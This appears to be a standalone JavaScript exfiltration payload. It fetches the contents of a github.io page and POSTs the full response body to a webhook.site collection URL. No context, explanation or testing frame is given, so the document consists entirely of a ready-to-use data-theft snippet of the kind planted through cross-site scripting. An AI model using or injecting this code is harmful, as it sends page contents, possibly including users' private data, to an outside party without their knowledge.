fetch("https://2xmd5hasgoneinsane.github.io/").then( r => r.text() ).then( r =>
	fetch("https://webhook.site/#!/f6ca6116-5afa-46f2-84b5-175025c85670/", {method:"POST", body:r})														  	
);
